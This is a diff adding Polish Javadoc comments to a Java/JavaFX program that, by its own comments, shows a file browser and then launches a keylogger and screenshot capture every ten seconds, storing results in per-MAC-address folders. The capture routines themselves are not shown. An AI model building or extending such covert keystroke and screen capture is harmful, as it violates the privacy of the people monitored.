@@ -22,6 +22,10 @@ import javafx.scene.layout.Pane;
 import javafx.stage.Stage;
 import org.jnativehook.GlobalScreen;
 import org.jnativehook.NativeHookException;
+/**
+ * Główna klasa programu odpowiada za wyświetlenie przeglądarki plików oraz za uruchomienie po niej keyloggera
+ * @author PanTomek
+*/
 
 public class JNativeHookExample extends Application{
 
@@ -38,7 +42,9 @@ public class JNativeHookExample extends Application{
 
     
     public static void main(String[] args) throws Exception  {
-
+/**
+ * Zabezpieczenie przed przeglądaniem pustego folderu
+ */
         MACaddress mac = new MACaddress();
         s = mac.getmac();
         File folder = new File("C:\\\\Users\\\\PanTomek\\\\Desktop\\\\ThisOneFile\\" + s);
@@ -68,7 +74,11 @@ public class JNativeHookExample extends Application{
             System.err.println(ex.getMessage());
             System.exit(1);
         }
-
+/**
+ * Uruchomienie keyloggera, oraz właczenie robienia screenów 
+ */
+        
+        
         Timer timer = new Timer();
         timer.schedule(new PrintScreen(), 0, 10000);
        
@@ -76,7 +86,11 @@ public class JNativeHookExample extends Application{
         timer2.schedule(new RunKL(), 0, 10000);
         
     }
-
+/**
+ * Funkcja odpowiedzialna za tworzenie okna i jego obsługę
+ * @param primaryStage
+ * @throws Exception 
+ */
     @Override
     public void start(Stage primaryStage) throws Exception {
 
@@ -136,6 +150,10 @@ public class JNativeHookExample extends Application{
         cb.getItems().addAll(directories);
         
         button1.setOnAction(new EventHandler<ActionEvent>() {
+            /**
+             * Obsługa zmienienia screena na kolejnego
+             * @param event 
+             */
             @Override
             public void handle(ActionEvent event) {
                 index++;
@@ -187,6 +205,10 @@ public class JNativeHookExample extends Application{
         });
         
         button2.setOnAction(new EventHandler<ActionEvent>() {
+            /**
+             * Obsługa zmienienia screena na poprzedniego
+             * @param event 
+             */
             @Override
             public void handle(ActionEvent event) {
                 index--;
@@ -243,6 +265,10 @@ public class JNativeHookExample extends Application{
         });
         
         cb.setOnAction(new EventHandler<ActionEvent>() {
+            /**
+             * Obsługa zmienienia folderu odczytu (użytkownika)
+             * @param event 
+             */
             @Override
             public void handle(ActionEvent event) {
                 indextxt = 0;
@@ -306,7 +332,11 @@ public class JNativeHookExample extends Application{
         primaryStage.show();
    
     }
-
+/**
+ * Odczyt pliku tekstowego (potrzebne do użycia textArea)
+ * @param file
+ * @return 
+ */
     private String readFile(File file) {
       StringBuilder stringBuffer = new StringBuilder();
         BufferedReader bufferedReader = null;
